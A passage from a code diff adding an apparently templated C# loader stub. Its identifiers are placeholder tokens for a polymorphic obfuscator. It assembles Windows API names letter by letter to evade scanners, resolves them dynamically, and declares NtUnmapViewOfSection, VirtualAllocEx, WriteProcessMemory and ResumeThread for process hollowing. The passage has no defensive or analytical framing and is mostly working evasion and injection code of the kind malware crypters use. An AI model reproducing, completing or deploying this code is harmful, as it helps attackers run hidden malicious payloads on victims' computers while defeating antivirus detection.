+		   %$#@additionaltrigger___CreateProcessA___37@#$%
+		   %$#@additionaltrigger___CreateProcessA___38@#$%
+		   parts[10]="e";
+		   %$#@additionaltrigger___CreateProcessA___39@#$%
+		   %$#@additionaltrigger___CreateProcessA___40@#$%
+		   %$#@additionaltrigger___CreateProcessA___41@#$%
+		   parts[11]="s";
+		   %$#@additionaltrigger___CreateProcessA___42@#$%
+		   %$#@additionaltrigger___CreateProcessA___43@#$%
+		   %$#@additionaltrigger___CreateProcessA___44@#$%
+		   parts[12]="s";
+		   %$#@additionaltrigger___CreateProcessA___45@#$%
+		   %$#@additionaltrigger___CreateProcessA___46@#$%
+		   %$#@additionaltrigger___CreateProcessA___47@#$%
+		   parts[13]="A";
+		   %$#@additionaltrigger___CreateProcessA___48@#$%
+		   %$#@additionaltrigger___CreateProcessA___49@#$%
+		   %$#@additionaltrigger___CreateProcessA___50@#$%
+
+		      for (int i = 0; i < 14; i++)
+              {
+		      %$#@additionaltrigger___CreateProcessA___51@#$%
+		      %$#@additionaltrigger___CreateProcessA___52@#$%
+		      %$#@additionaltrigger___CreateProcessA___53@#$%
+			  rez=rez+parts[i];
+		      %$#@additionaltrigger___CreateProcessA___54@#$%
+		      %$#@additionaltrigger___CreateProcessA___55@#$%
+		      %$#@additionaltrigger___CreateProcessA___56@#$%
+		      }
+		   %$#@additionaltrigger___CreateProcessA___57@#$%
+		   %$#@additionaltrigger___CreateProcessA___58@#$%
+		   %$#@additionaltrigger___CreateProcessA___59@#$%
+		   return rez;
+		   }
+
+		%$#@betweentriggerRSNDT67@#$%
+		%$#@betweentriggerRSNDT68@#$%
+		%$#@betweentriggerRSNDT69@#$%
+		%$#@betweentriggerRSNDT70@#$%
+		%$#@betweentriggerRSNDT71@#$%
+		%$#@betweentriggerRSNDT72@#$%
+
+		public static string %$#@basictrigger___NtQueryInformationProcess___@#$%()
+		   {
+		   %$#@additionaltrigger___NtQueryInformationProcess___00@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___01@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___NtQueryInformationProcess___04@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___05@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___06@#$%
+		   string[] parts=new string[25];
+		   %$#@additionaltrigger___NtQueryInformationProcess___07@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___08@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___09@#$%
+
+		   parts[0]="N";
+		   %$#@additionaltrigger___NtQueryInformationProcess___10@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___11@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___12@#$%
+		   parts[1]="t";
+		   %$#@additionaltrigger___NtQueryInformationProcess___13@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___14@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___15@#$%
+		   parts[2]="Q";
+		   %$#@additionaltrigger___NtQueryInformationProcess___16@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___17@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___18@#$%
+		   parts[3]="u";
+		   %$#@additionaltrigger___NtQueryInformationProcess___19@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___20@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___21@#$%
+		   parts[4]="e";
+		   %$#@additionaltrigger___NtQueryInformationProcess___22@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___23@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___24@#$%
+		   parts[5]="r";
+		   %$#@additionaltrigger___NtQueryInformationProcess___25@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___26@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___27@#$%
+		   parts[6]="y";
+		   %$#@additionaltrigger___NtQueryInformationProcess___28@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___29@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___30@#$%
+		   parts[7]="I";
+		   %$#@additionaltrigger___NtQueryInformationProcess___31@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___32@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___33@#$%
+		   parts[8]="n";
+		   %$#@additionaltrigger___NtQueryInformationProcess___34@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___35@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___36@#$%
+		   parts[9]="f";
+		   %$#@additionaltrigger___NtQueryInformationProcess___37@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___38@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___39@#$%
+		   parts[10]="o";
+		   %$#@additionaltrigger___NtQueryInformationProcess___40@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___41@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___42@#$%
+		   parts[11]="r";
+		   %$#@additionaltrigger___NtQueryInformationProcess___43@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___44@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___45@#$%
+		   parts[12]="m";
+		   %$#@additionaltrigger___NtQueryInformationProcess___46@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___47@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___48@#$%
+		   parts[13]="a";
+		   %$#@additionaltrigger___NtQueryInformationProcess___49@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___50@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___51@#$%
+		   parts[14]="t";
+		   %$#@additionaltrigger___NtQueryInformationProcess___52@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___53@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___54@#$%
+		   parts[15]="i";
+		   %$#@additionaltrigger___NtQueryInformationProcess___55@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___56@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___57@#$%
+		   parts[16]="o";
+		   %$#@additionaltrigger___NtQueryInformationProcess___58@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___59@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___60@#$%
+		   parts[17]="n";
+		   %$#@additionaltrigger___NtQueryInformationProcess___61@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___62@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___63@#$%
+		   parts[18]="P";
+		   %$#@additionaltrigger___NtQueryInformationProcess___64@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___65@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___66@#$%
+		   parts[19]="r";
+		   %$#@additionaltrigger___NtQueryInformationProcess___67@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___68@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___69@#$%
+		   parts[20]="o";
+		   %$#@additionaltrigger___NtQueryInformationProcess___70@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___71@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___72@#$%
+		   parts[21]="c";
+		   %$#@additionaltrigger___NtQueryInformationProcess___73@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___74@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___75@#$%
+		   parts[22]="e";
+		   %$#@additionaltrigger___NtQueryInformationProcess___76@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___77@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___78@#$%
+		   parts[23]="s";
+		   %$#@additionaltrigger___NtQueryInformationProcess___79@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___80@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___81@#$%
+		   parts[24]="s";
+		   %$#@additionaltrigger___NtQueryInformationProcess___82@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___83@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___84@#$%
+
+		      for (int i = 0; i < 25; i++)
+              {
+		      %$#@additionaltrigger___NtQueryInformationProcess___85@#$%
+		      %$#@additionaltrigger___NtQueryInformationProcess___86@#$%
+		      %$#@additionaltrigger___NtQueryInformationProcess___87@#$%
+			  rez=rez+parts[i];
+		      %$#@additionaltrigger___NtQueryInformationProcess___88@#$%
+		      %$#@additionaltrigger___NtQueryInformationProcess___89@#$%
+		      %$#@additionaltrigger___NtQueryInformationProcess___90@#$%
+		      }
+		   %$#@additionaltrigger___NtQueryInformationProcess___91@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___92@#$%
+		   %$#@additionaltrigger___NtQueryInformationProcess___93@#$%
+		   return rez;
+		   }
+
+		%$#@betweentriggerRSNDT73@#$%
+		%$#@betweentriggerRSNDT74@#$%
+		%$#@betweentriggerRSNDT75@#$%
+		%$#@betweentriggerRSNDT76@#$%
+		%$#@betweentriggerRSNDT77@#$%
+		%$#@betweentriggerRSNDT78@#$%
+
+		public static string %$#@basictrigger___LoadLibraryA___@#$%()
+		   {
+		   %$#@additionaltrigger___LoadLibraryA___00@#$%
+		   %$#@additionaltrigger___LoadLibraryA___01@#$%
+		   %$#@additionaltrigger___LoadLibraryA___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___LoadLibraryA___03@#$%
+		   %$#@additionaltrigger___LoadLibraryA___04@#$%
+		   %$#@additionaltrigger___LoadLibraryA___05@#$%
+		   string[] parts=new string[12];
+		   %$#@additionaltrigger___LoadLibraryA___06@#$%
+		   %$#@additionaltrigger___LoadLibraryA___07@#$%
+		   %$#@additionaltrigger___LoadLibraryA___08@#$%
+
+		   parts[0]="L";
+		   %$#@additionaltrigger___LoadLibraryA___09@#$%
+		   %$#@additionaltrigger___LoadLibraryA___10@#$%
+		   %$#@additionaltrigger___LoadLibraryA___11@#$%
+		   parts[1]="o";
+		   %$#@additionaltrigger___LoadLibraryA___12@#$%
+		   %$#@additionaltrigger___LoadLibraryA___13@#$%
+		   %$#@additionaltrigger___LoadLibraryA___14@#$%
+		   parts[2]="a";
+		   %$#@additionaltrigger___LoadLibraryA___15@#$%
+		   %$#@additionaltrigger___LoadLibraryA___16@#$%
+		   %$#@additionaltrigger___LoadLibraryA___17@#$%
+		   parts[3]="d";
+		   %$#@additionaltrigger___LoadLibraryA___18@#$%
+		   %$#@additionaltrigger___LoadLibraryA___19@#$%
+		   %$#@additionaltrigger___LoadLibraryA___20@#$%
+		   parts[4]="L";
+		   %$#@additionaltrigger___LoadLibraryA___21@#$%
+		   %$#@additionaltrigger___LoadLibraryA___22@#$%
+		   %$#@additionaltrigger___LoadLibraryA___23@#$%
+		   parts[5]="i";
+		   %$#@additionaltrigger___LoadLibraryA___24@#$%
+		   %$#@additionaltrigger___LoadLibraryA___25@#$%
+		   %$#@additionaltrigger___LoadLibraryA___26@#$%
+		   parts[6]="b";
+		   %$#@additionaltrigger___LoadLibraryA___27@#$%
+		   %$#@additionaltrigger___LoadLibraryA___28@#$%
+		   %$#@additionaltrigger___LoadLibraryA___29@#$%
+		   parts[7]="r";
+		   %$#@additionaltrigger___LoadLibraryA___30@#$%
+		   %$#@additionaltrigger___LoadLibraryA___31@#$%
+		   %$#@additionaltrigger___LoadLibraryA___32@#$%
+		   parts[8]="a";
+		   %$#@additionaltrigger___LoadLibraryA___33@#$%
+		   %$#@additionaltrigger___LoadLibraryA___34@#$%
+		   %$#@additionaltrigger___LoadLibraryA___35@#$%
+		   parts[9]="r";
+		   %$#@additionaltrigger___LoadLibraryA___36@#$%
+		   %$#@additionaltrigger___LoadLibraryA___37@#$%
+		   %$#@additionaltrigger___LoadLibraryA___38@#$%
+		   parts[10]="y";
+		   %$#@additionaltrigger___LoadLibraryA___39@#$%
+		   %$#@additionaltrigger___LoadLibraryA___40@#$%
+		   %$#@additionaltrigger___LoadLibraryA___41@#$%
+		   parts[11]="A";
+		   %$#@additionaltrigger___LoadLibraryA___42@#$%
+		   %$#@additionaltrigger___LoadLibraryA___43@#$%
+		   %$#@additionaltrigger___LoadLibraryA___44@#$%
+
+		      for (int i = 0; i < 12; i++)
+              {
+		      %$#@additionaltrigger___LoadLibraryA___45@#$%
+		      %$#@additionaltrigger___LoadLibraryA___46@#$%
+		      %$#@additionaltrigger___LoadLibraryA___47@#$%
+			  rez=rez+parts[i];
+		      %$#@additionaltrigger___LoadLibraryA___48@#$%
+		      %$#@additionaltrigger___LoadLibraryA___49@#$%
+		      %$#@additionaltrigger___LoadLibraryA___50@#$%
+		      }
+		   %$#@additionaltrigger___LoadLibraryA___51@#$%
+		   %$#@additionaltrigger___LoadLibraryA___52@#$%
+		   %$#@additionaltrigger___LoadLibraryA___53@#$%
+		   return rez;
+		   }
+
+	    %$#@betweentrigger591@#$%
+		%$#@betweentrigger592@#$%
+		%$#@betweentrigger593@#$%
+		%$#@betweentrigger594@#$%
+		%$#@betweentrigger595@#$%
+		%$#@betweentrigger596@#$%
+        public delegate uint %$#@basictriggerResumeThreadParametrs@#$%(IntPtr %$#@basictriggerhThread@#$%);
+	    %$#@betweentrigger597@#$%
+		%$#@betweentrigger598@#$%
+		%$#@betweentrigger599@#$%
+		%$#@betweentrigger600@#$%
+		%$#@betweentrigger601@#$%
+		%$#@betweentrigger602@#$%		
+        public static readonly %$#@basictriggerResumeThreadParametrs@#$% %$#@basictriggerResumeThread@#$% = %$#@basictriggerCreateApi0@#$%<%$#@basictriggerResumeThreadParametrs@#$%>(%$#@basictrigger___kernel32___@#$%(), %$#@basictrigger___ResumeThread___@#$%());
+	    %$#@betweentrigger603@#$%
+		%$#@betweentrigger604@#$%
+		%$#@betweentrigger605@#$%
+		%$#@betweentrigger606@#$%
+		%$#@betweentrigger607@#$%
+		%$#@betweentrigger608@#$%		
+
+        public delegate bool %$#@basictriggerFlushInstructionCacheParameters@#$%(IntPtr %$#@basictriggerhProcess@#$%, IntPtr %$#@basictriggerBaseAddress@#$%, uint %$#@basictriggerdwSize@#$%);
+	    %$#@betweentrigger609@#$%
+		%$#@betweentrigger610@#$%
+		%$#@betweentrigger611@#$%
+		%$#@betweentrigger612@#$%
+		%$#@betweentrigger613@#$%
+		%$#@betweentrigger614@#$%		
+        public static readonly %$#@basictriggerFlushInstructionCacheParameters@#$% %$#@basictriggerFI0@#$% = %$#@basictriggerCreateApi0@#$%<%$#@basictriggerFlushInstructionCacheParameters@#$%>(%$#@basictrigger___kernel32___@#$%(), %$#@basictrigger___FlushInstructionCache___@#$%());
+	    %$#@betweentrigger615@#$%
+		%$#@betweentrigger616@#$%
+		%$#@betweentrigger617@#$%
+		%$#@betweentrigger618@#$%
+		%$#@betweentrigger619@#$%
+		%$#@betweentrigger620@#$%
+        public delegate bool %$#@basictriggerVirtualProtectExParameters@#$%(IntPtr %$#@basictriggerhProcess@#$%, IntPtr %$#@basictriggerlpAddress@#$%, uint %$#@basictriggerdwSize@#$%, uint %$#@basictriggerflNewProtect@#$%, ref uint %$#@basictriggerlpflOldProtect@#$%);
+	    %$#@betweentrigger621@#$%
+		%$#@betweentrigger622@#$%
+		%$#@betweentrigger623@#$%
+		%$#@betweentrigger624@#$%
+		%$#@betweentrigger625@#$%
+		%$#@betweentrigger626@#$%		
+        public static readonly %$#@basictriggerVirtualProtectExParameters@#$% %$#@basictriggerVP0@#$% = %$#@basictriggerCreateApi0@#$%<%$#@basictriggerVirtualProtectExParameters@#$%>(%$#@basictrigger___kernel32___@#$%(), %$#@basictrigger___VirtualProtectEx___@#$%());
+	    %$#@betweentrigger627@#$%
+		%$#@betweentrigger628@#$%
+		%$#@betweentrigger629@#$%
+		%$#@betweentrigger630@#$%
+		%$#@betweentrigger631@#$%
+		%$#@betweentrigger632@#$%
+        public delegate uint %$#@basictriggerNtQueryInformationProcessParameters@#$%(IntPtr %$#@basictriggerhProcess@#$%, uint %$#@basictriggerProcessInformationClass@#$%, ref %$#@basictriggerC0@#$%.%$#@basictriggerS1@#$% %$#@basictriggerProcessInformation@#$%, uint %$#@basictriggerProcessInformationLength@#$%, ref UIntPtr %$#@basictriggerReturnLength@#$%);
+	    %$#@betweentrigger633@#$%
+		%$#@betweentrigger634@#$%
+		%$#@betweentrigger635@#$%
+		%$#@betweentrigger636@#$%
+		%$#@betweentrigger637@#$%
+		%$#@betweentrigger638@#$%		
+        public delegate uint %$#@basictriggerNtQueryInformationProcessParameters2@#$%(IntPtr %$#@basictriggerhProcess@#$%, uint %$#@basictriggerProcessInformationClass@#$%, ref UIntPtr %$#@basictriggerProcessInformation@#$%, uint %$#@basictriggerProcessInformationLength@#$%, ref UIntPtr %$#@basictriggerReturnLength@#$%);
+	    %$#@betweentrigger639@#$%
+		%$#@betweentrigger640@#$%
+		%$#@betweentrigger641@#$%
+		%$#@betweentrigger642@#$%
+		%$#@betweentrigger643@#$%
+		%$#@betweentrigger644@#$%
+        public delegate bool %$#@basictriggerReadProcessMemoryParametrs@#$%(IntPtr %$#@basictriggerhProcess@#$%, IntPtr %$#@basictriggerlpBaseAddress@#$%, [Out] byte[] %$#@basictriggerlpBuffer@#$%, uint %$#@basictriggernSize@#$%, ref uint %$#@basictriggerlpNumberOfBytesRead@#$%);
+	    %$#@betweentrigger645@#$%
+		%$#@betweentrigger646@#$%
+		%$#@betweentrigger647@#$%
+		%$#@betweentrigger648@#$%
+		%$#@betweentrigger649@#$%
+		%$#@betweentrigger650@#$%		
+        public static readonly %$#@basictriggerReadProcessMemoryParametrs@#$% %$#@basictrigger105@#$% = %$#@basictriggerCreateApi0@#$%<%$#@basictriggerReadProcessMemoryParametrs@#$%>(%$#@basictrigger___kernel32___@#$%(), %$#@basictrigger___ReadProcessMemory___@#$%());
+	    %$#@betweentrigger651@#$%
+		%$#@betweentrigger652@#$%
+		%$#@betweentrigger653@#$%
+		%$#@betweentrigger654@#$%
+		%$#@betweentrigger655@#$%
+		%$#@betweentrigger656@#$%
+        public delegate bool %$#@basictriggerWriteProcessMemoryParametrs@#$%(IntPtr %$#@basictriggerhProcess@#$%, IntPtr %$#@basictriggerlpBaseAddress@#$%, [In] byte[] %$#@basictriggerlpBuffer@#$%, uint %$#@basictriggernSize@#$%, ref uint %$#@basictriggerlpNumberOfBytesWritten@#$%);
+	    %$#@betweentrigger657@#$%
+		%$#@betweentrigger658@#$%
+		%$#@betweentrigger659@#$%
+		%$#@betweentrigger660@#$%
+		%$#@betweentrigger661@#$%
+		%$#@betweentrigger662@#$%		
+        public static readonly %$#@basictriggerWriteProcessMemoryParametrs@#$% %$#@basictriggerWP0@#$% = %$#@basictriggerCreateApi0@#$%<%$#@basictriggerWriteProcessMemoryParametrs@#$%>(%$#@basictrigger___kernel32___@#$%(), %$#@basictrigger___WriteProcessMemory___@#$%());
+	    %$#@betweentrigger663@#$%
+		%$#@betweentrigger664@#$%
+		%$#@betweentrigger665@#$%
+		%$#@betweentrigger666@#$%
+		%$#@betweentrigger667@#$%
+		%$#@betweentrigger668@#$%
+        public delegate uint %$#@basictriggerNtUnmapViewOfSectionParametrs@#$%(IntPtr %$#@basictriggerhProcess@#$%, IntPtr pBaseAddress);
+	    %$#@betweentrigger669@#$%
+		%$#@betweentrigger670@#$%
+		%$#@betweentrigger671@#$%
+		%$#@betweentrigger672@#$%
+		%$#@betweentrigger673@#$%
+		%$#@betweentrigger674@#$%		
+        public static readonly %$#@basictriggerNtUnmapViewOfSectionParametrs@#$% %$#@basictriggerNtUnmapViewOfSection@#$% = %$#@basictriggerCreateApi0@#$%<%$#@basictriggerNtUnmapViewOfSectionParametrs@#$%>(%$#@basictrigger___ntdll___@#$%(), %$#@basictrigger___NtUnmapViewOfSection___@#$%());
+	    %$#@betweentrigger675@#$%
+		%$#@betweentrigger676@#$%
+		%$#@betweentrigger677@#$%
+		%$#@betweentrigger678@#$%
+		%$#@betweentrigger679@#$%
+		%$#@betweentrigger680@#$%		
+        public delegate IntPtr %$#@basictriggerVirtualAllocExParametrs@#$%(IntPtr %$#@basictriggerhProcess@#$%, IntPtr %$#@basictriggerlpAddress@#$%, uint dwS%$#@basictriggerdwSize@#$%ize, uint %$#@basictriggerflAllocationType@#$%, uint %$#@basictriggerflProtect@#$%);
+	    %$#@betweentrigger681@#$%
+		%$#@betweentrigger682@#$%
+		%$#@betweentrigger683@#$%
+		%$#@betweentrigger684@#$%
+		%$#@betweentrigger685@#$%
+		%$#@betweentrigger686@#$%		
+        public static readonly %$#@basictriggerVirtualAllocExParametrs@#$% %$#@basictriggerVirtualAllocEx@#$% = %$#@basictriggerCreateApi0@#$%<%$#@basictriggerVirtualAllocExParametrs@#$%>(%$#@basictrigger___kernel32___@#$%(), %$#@basictrigger___VirtualAllocEx___@#$%());
+	    %$#@betweentrigger687@#$%
+		%$#@betweentrigger688@#$%
+		%$#@betweentrigger689@#$%
+		%$#@betweentrigger690@#$%
+		%$#@betweentrigger691@#$%
+		%$#@betweentrigger692@#$%		
+        public delegate bool %$#@basictriggerIsWow64ProcessParameters@#$%(IntPtr %$#@basictriggerhProcess@#$%, ref bool %$#@basictriggerWow64Process@#$%);
+	    %$#@betweentrigger693@#$%
+		%$#@betweentrigger694@#$%
+		%$#@betweentrigger695@#$%
+		%$#@betweentrigger696@#$%
+		%$#@betweentrigger697@#$%
+		%$#@betweentrigger698@#$%		
+        public readonly static %$#@basictriggerIsWow64ProcessParameters@#$% %$#@basictriggerIsW0@#$% = %$#@basictriggerCreateApi0@#$%<%$#@basictriggerIsWow64ProcessParameters@#$%>(%$#@basictrigger___kernel32___@#$%(), %$#@basictrigger___IsWow64Process___@#$%());
+	    %$#@betweentrigger699@#$%
+		%$#@betweentrigger700@#$%
+		%$#@betweentrigger701@#$%
+		%$#@betweentrigger702@#$%
+		%$#@betweentrigger703@#$%
+		%$#@betweentrigger704@#$%		
+        public delegate bool %$#@basictriggerCreateProcessParametrs@#$%(string %$#@basictriggerapplicationName@#$%, string %$#@basictriggercommandLine@#$%, IntPtr %$#@basictriggerprocessAttributes@#$%, IntPtr %$#@basictriggerthreadAttributes@#$%, bool %$#@basictriggerinheritHandles@#$%, uint %$#@basictriggercreationFlags@#$%, IntPtr %$#@basictriggerenvironment@#$%, string %$#@basictriggercurrentDirectory@#$%, ref %$#@basictriggerC0@#$%.%$#@basictriggerS0@#$% %$#@basictriggerstartupInfo@#$%, ref %$#@basictriggerC0@#$%.%$#@basictriggerS2@#$% %$#@basictriggerprocessInformation@#$%);
+	    %$#@betweentrigger705@#$%
+		%$#@betweentrigger706@#$%
+		%$#@betweentrigger707@#$%
+		%$#@betweentrigger708@#$%
+		%$#@betweentrigger709@#$%
+		%$#@betweentrigger710@#$%		
+        public static readonly %$#@basictriggerCreateProcessParametrs@#$% %$#@basictriggerCP0@#$% = %$#@basictriggerCreateApi0@#$%<%$#@basictriggerCreateProcessParametrs@#$%>(%$#@basictrigger___kernel32___@#$%(), %$#@basictrigger___CreateProcessA___@#$%());
+	    %$#@betweentrigger711@#$%
+		%$#@betweentrigger712@#$%
+		%$#@betweentrigger713@#$%
+		%$#@betweentrigger714@#$%
+		%$#@betweentrigger715@#$%
+		%$#@betweentrigger716@#$%		
+        public static readonly %$#@basictriggerNtQueryInformationProcessParameters2@#$% %$#@basictriggerIP2@#$% = %$#@basictriggerCreateApi0@#$%<%$#@basictriggerNtQueryInformationProcessParameters2@#$%>(%$#@basictrigger___ntdll___@#$%(), %$#@basictrigger___NtQueryInformationProcess___@#$%());
+	    %$#@betweentrigger717@#$%
+		%$#@betweentrigger718@#$%
+		%$#@betweentrigger719@#$%
+		%$#@betweentrigger720@#$%
+		%$#@betweentrigger721@#$%
+		%$#@betweentrigger722@#$%		
+        public static readonly %$#@basictriggerNtQueryInformationProcessParameters@#$% %$#@basictriggerIP1@#$% = %$#@basictriggerCreateApi0@#$%<%$#@basictriggerNtQueryInformationProcessParameters@#$%>(%$#@basictrigger___ntdll___@#$%(), %$#@basictrigger___NtQueryInformationProcess___@#$%());
+	    %$#@betweentrigger723@#$%
+		%$#@betweentrigger724@#$%
+		%$#@betweentrigger725@#$%
+		%$#@betweentrigger726@#$%
+		%$#@betweentrigger727@#$%
+		%$#@betweentrigger728@#$%		
+        public delegate IntPtr %$#@basictriggerLoadLibraryParametrs@#$%(string %$#@basictriggername0@#$%);
+	    %$#@betweentrigger729@#$%
+		%$#@betweentrigger730@#$%
+		%$#@betweentrigger731@#$%
+		%$#@betweentrigger732@#$%
+		%$#@betweentrigger733@#$%
+		%$#@betweentrigger734@#$%		
+        public static readonly %$#@basictriggerLoadLibraryParametrs@#$% %$#@basictriggerLoadLibrary@#$% = %$#@basictriggerCreateApi0@#$%<%$#@basictriggerLoadLibraryParametrs@#$%>(%$#@basictrigger___kernel32___@#$%(), %$#@basictrigger___LoadLibraryA___@#$%());
+	    %$#@betweentrigger735@#$%
+		%$#@betweentrigger736@#$%
+		%$#@betweentrigger737@#$%
+		%$#@betweentrigger738@#$%
+		%$#@betweentrigger739@#$%
+		%$#@betweentrigger740@#$%		
+
+        public delegate object %$#@basictriggerAWGBRSJK@#$%(object %$#@basictriggerBDANYRA@#$%, Type %$#@basictriggerdstnrys@#$%);
+        public static readonly %$#@basictriggerAWGBRSJK@#$% %$#@basictriggerAWGBRSJK_D@#$% = Convert.ChangeType;
+
+        public delegate Delegate %$#@basictriggerAWGBRSJK_0@#$%(IntPtr %$#@basictriggerBDANYRA_0@#$%, Type %$#@basictriggerdstnrys_0@#$%);
+        public static readonly %$#@basictriggerAWGBRSJK_0@#$% %$#@basictriggerAWGBRSJK_0_D@#$% = Marshal.GetDelegateForFunctionPointer;
+
+        public delegate void %$#@basictriggerAWGBRSJK_1@#$%(IntPtr %$#@basictriggerBDANYRA_1@#$%, byte[] %$#@basictriggerdstnrys_1@#$%, int %$#@basictriggerdbnedj@#$%, int %$#@basictriggerdobheo@#$%);
+        public static readonly %$#@basictriggerAWGBRSJK_1@#$% %$#@basictriggerAWGBRSJK_1_D@#$% = System.Runtime.InteropServices.Marshal.Copy;
+
+        public delegate int %$#@basictriggerAWGBRSJK_2@#$%(IntPtr %$#@basictriggerBDANYRA_2@#$%);
+        public static readonly %$#@basictriggerAWGBRSJK_2@#$% %$#@basictriggerAWGBRSJK_2_D@#$% = Marshal.ReadInt32;
+
+        public delegate string %$#@basictriggerAWGBRSJK_3@#$%(byte[] %$#@basictriggerBDANYRA_3@#$%);
+        public static readonly %$#@basictriggerAWGBRSJK_3@#$% %$#@basictriggerAWGBRSJK_3_D@#$% = Encoding.ASCII.GetString;
+
+        public delegate short %$#@basictriggerAWGBRSJK_4@#$%(byte[] %$#@basictriggerBDANYRA_4@#$%, int %$#@basictriggerdstnrys_4@#$%);
+        public static readonly %$#@basictriggerAWGBRSJK_4@#$% %$#@basictriggerAWGBRSJK_4_D@#$% = BitConverter.ToInt16;
+
+        public delegate int %$#@basictriggerAWGBRSJK_5@#$%(byte[] %$#@basictriggerBDANYRA_5@#$%, int %$#@basictriggerdstnrys_5@#$%);
+        public static readonly %$#@basictriggerAWGBRSJK_5@#$% %$#@basictriggerAWGBRSJK_5_D@#$% = BitConverter.ToInt32;
+
+
+        public static %$#@basictriggerT02@#$% %$#@basictriggerCreateApi0@#$%<%$#@basictriggerT02@#$%>(string %$#@basictriggername1@#$%, string %$#@basictriggermethod0@#$%)
+        {
+		    %$#@additionaltriggerCreateApi09@#$%
+			%$#@additionaltriggerCreateApi10@#$%
+			%$#@additionaltriggerCreateApi11@#$%
+		    %$#@basictriggerT02@#$% %$#@basictriggerT0__2@#$%=(%$#@basictriggerT02@#$%)((object)null);
+		    %$#@additionaltriggerCreateApi00@#$%
+			%$#@additionaltriggerCreateApi01@#$%
+			%$#@additionaltriggerCreateApi02@#$%
+			if (true)
+			   {
+		       %$#@additionaltrigger_ESHBRSNSR_00@#$%
+			   %$#@additionaltrigger_ESHBRSNSR_01@#$%
+			   %$#@additionaltrigger_ESHBRSNSR_02@#$%
+			   %$#@basictriggerT0__2@#$%=(%$#@basictriggerT02@#$%)((object)Convert.ChangeType((object)Marshal.GetDelegateForFunctionPointer((IntPtr)%$#@basictriggerGetProcAddress1@#$%((Int64)%$#@basictriggerGetInternalModuleBaseAddr0@#$%(%$#@basictriggername1@#$%), %$#@basictriggermethod0@#$%), typeof(%$#@basictriggerT02@#$%)), typeof(%$#@basictriggerT02@#$%)));
+		       %$#@additionaltrigger_ESHBRSNSR_03@#$%
+			   %$#@additionaltrigger_ESHBRSNSR_04@#$%
+			   %$#@additionaltrigger_ESHBRSNSR_05@#$%
+			   }
+		    %$#@additionaltriggerCreateApi03@#$%
+			%$#@additionaltriggerCreateApi04@#$%
+			%$#@additionaltriggerCreateApi05@#$%
+		    %$#@additionaltriggerCreateApi06@#$%
+			%$#@additionaltriggerCreateApi07@#$%
+			%$#@additionaltriggerCreateApi08@#$%
+            return %$#@basictriggerT0__2@#$%;
+        }
+	    %$#@betweentrigger741@#$%
+		%$#@betweentrigger742@#$%
+		%$#@betweentrigger743@#$%
+		%$#@betweentrigger744@#$%
+		%$#@betweentrigger745@#$%
+		%$#@betweentrigger746@#$%		
+        public static IntPtr %$#@basictriggerGetInternalModuleBaseAddr0@#$%(string %$#@basictriggername12@#$%)
+        {
+			%$#@additionaltriggerGetInternalModuleBaseAddr0@#$%
+		    %$#@additionaltriggerGetInternalModuleBaseAddr1@#$%
+		    %$#@additionaltriggerGetInternalModuleBaseAddr2@#$%
+            if (!%$#@basictriggername12@#$%.Contains(".dll"))
+            {
+			    %$#@additionaltriggerGetInternalModuleBaseAddr3@#$%
+		        %$#@additionaltriggerGetInternalModuleBaseAddr4@#$%
+		        %$#@additionaltriggerGetInternalModuleBaseAddr5@#$%
+                %$#@basictriggername12@#$% += ".dll";
